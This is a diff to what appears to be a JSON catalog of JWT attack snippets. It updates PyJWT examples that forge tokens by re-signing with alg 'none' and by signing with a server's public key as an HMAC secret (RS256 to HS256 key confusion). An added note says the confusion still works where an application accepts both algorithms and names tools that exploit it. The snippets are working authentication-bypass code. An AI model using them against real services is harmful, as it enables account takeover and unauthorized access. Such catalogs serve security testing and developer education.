@@ -138,7 +138,7 @@
       "title": "None - building the token manually (PyJWT)",
       "language": "python",
       "tags": ["alg-none", "pyjwt"],
-      "body": "import jwt\n\njwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'\ndecodedToken = jwt.decode(jwtToken, verify=False)       \n\n# decode the token before encoding with type 'None'\nnoneEncoded = jwt.encode(decodedToken, key='', algorithm=None)\n\nprint(noneEncoded.decode())"
+      "body": "import jwt\n\njwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'\ndecodedToken = jwt.decode(jwtToken, options={\"verify_signature\": False})\n\n# decode the token before encoding with type 'None'\nnoneEncoded = jwt.encode(decodedToken, key='', algorithm='none')\n\nprint(noneEncoded)"
     },
     {
       "subcategory": "Weak secret",
@@ -187,14 +187,14 @@
       "title": "Signing with the public key as HMAC (PyJWT)",
       "language": "python",
       "tags": ["key-confusion", "pyjwt", "sign"],
-      "body": "import jwt\npublic = open('public.pem', 'r').read()\nprint public\nprint jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256')"
+      "body": "import jwt\npublic = open('public.pem', 'r').read()\nprint(public)\nprint(jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256'))"
     },
     {
       "subcategory": "Key Confusion RS256→HS256",
       "title": "Warning about the fix in PyJWT",
       "language": "text",
       "tags": ["key-confusion", "pyjwt"],
-      "body": "This behavior is fixed in the Python library and will now return an error:\njwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.\nTo reproduce it you need an old version: pip install pyjwt==0.4.3"
+      "body": "This behavior is fixed in the Python library and will now return an error:\njwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.\nTo reproduce it you need an old version: pip install pyjwt==0.4.3\n\nNB: key confusion itself is NOT dead - it lives in the APPLICATION whenever the verifier allows both a symmetric and an asymmetric alg: jwt.decode(token, public_key, algorithms=['HS256','RS256']). jwt_tool -X k and Burp JWT Editor still exploit it today."
     },
     {
       "subcategory": "Key Confusion RS256→HS256",
